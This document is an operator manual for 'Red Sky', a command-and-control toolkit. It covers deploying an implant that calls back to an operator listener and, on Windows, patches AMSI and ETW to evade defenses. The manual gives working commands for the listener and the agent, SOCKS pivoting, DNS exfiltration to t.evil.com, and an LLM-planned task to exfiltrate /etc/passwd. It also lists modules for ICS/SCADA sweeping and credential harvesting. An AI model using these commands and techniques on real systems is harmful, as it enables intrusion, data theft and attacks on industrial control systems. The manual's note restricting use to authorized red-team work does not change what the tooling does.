# Red Sky - operator manual

Version: v3.0.0-alpha.x
Binaries: redsky-core (operator), redsky-agent (implant)
Supported: linux, darwin, windows, freebsd (amd64 + arm64)

## Architecture

- `redsky-core` runs on the operator box. TUI, session manager, command dispatcher, TLS listener.
- `redsky-agent` runs on the target. Connects back over TLS, ECDH handshake, AES-256-GCM session, waits for tasks.

## 1. First run

Core generates an engagement CA under `~/.redsky/engagements/<name>/` on first launch, prints a fingerprint. Copy it.

Do not delete the engagement dir - new CA invalidates every deployed agent.

## 2. Start core

```
redsky-core -bind 0.0.0.0 -port 4444
```

Flags:
- `-bind`, `-port`, `-engagement`
- `-socks 127.0.0.1:1080` - SOCKS5 pivot through first agent
- `-pcap eth0 -pcap-out /tmp/cap.pcap -pcap-duration 30s`
- `-dns-exfil 0.0.0.0:5353 -dns-domain t.evil.com`
- `-plugin "report findings stats"` - run local Python module
- `-no-llm` / `-llm-model <name>` - planner config

## 3. Start agent

```
redsky-agent -host CORE_IP -port 4444 -tag mytag -ca-fingerprint 'FP'
```

Flags: `-host`, `-port`, `-tag`, `-ca-fingerprint`, `-beacon`, `-reconnect`.

Runs `evade.Init()` at startup. Windows: patches AMSI, ETW, resolves indirect syscalls. Linux/macOS: no-op. `NO_EVASION=1` skips.

## 4. TUI keys

- `tab` / `shift+tab` - cycle panes
- `up` / `down` - cursor
- `enter` - sessions: prompt | tasks: detail | prompt: send
- `esc` - clear / close / quit
- `?` - help
- `ctrl+c` - quit

## 5. Native agent modules

- `net_scanner` - TCP scan + service ID
- `iot` - ARP + mDns + SSDP + MQTT + CoAP
- `ics_scada` - Modbus / EtherNet-IP / OPC-UA / BACNet / Profinet
- `fiber_tap` - raw frame capture (Linux agent, root)
- `dns_exfil` - payload into DNS queries

## 6. Plan syntax

Type `:` at the prompt, then a goal. Ollama plans, modal previews, `y` executes.

```
:scan the local network for windows hosts
:find iot devices
:sweep for industrial control systems
:exfil /etc/passwd over dns
---
Whitelist: `net_scanner, ics_scada, iot, cred_harvest, wireless, report, dns`.

## 7. SOCKS pivot

```
redsky-core ... -socks 127.0.0.1:1080
```

Then route any tool through the agent:

```
curl --socks5 127.0.0.1:1080 http://10.0.0.5/
proxychains4 nmap -sT 10.0.0.0/24
```

Burp, Firefox, Postman - anything speaking SOCKS5.

## 8. DNS exfil

```
redsky-core ... -dns-exfil 0.0.0.0:5353 -dns-domain t.evil.com
```

Delegate NS for the domain to your core, or point the target resolver at the core port.

Label format: `seq-total-session-base32chunk.t.evil.com`. 40 bytes per query.

## 9. Packet capture

```
redsky-core ... -pcap eth0 -pcap-out /tmp/cap.pcap -pcap-duration 30s
```

Agent opens AF_PACKET, streams frames, core writes .pcap. Linux only, root needed.

## 10. Local Python modules

```
redsky-core -plugin "report findings stats"
```

Spawns `python3 redsky.py MOD ARGS` and captures stdout. Remote Python execution not implemented; only Go-native modules run in the agent.

## 11. Build

```
make build                    host -> ./bin
make build-all VERSION=vX     7 platforms -> ./dist/vX
make dist VERSION=vX          + tar.gz / zip / SHA256SUMS
```

Matrix: linux amd64+arm64, darwin amd64+arm64, windows amd64+arm64, freebsd amd64.

## 12. Troubleshooting

- `tls: pin mismatch` - core regenerated CA - copy new FP
- `bind: address already in use` - `ss -tlkp | grep 4444`
- `fiber_tap 0 frames` - interface idle - generate traffic
- `DNS exfil never ends` - core on 5353 not 53 - delegate domain
- `Ollama timeouts` - use smaller `-llm-model`

## 13. Legal

Dual-use toolkit. Intended for authorized testing, red team under written scope, internal research, CTF.
Authorization in writing separates red team from crime.
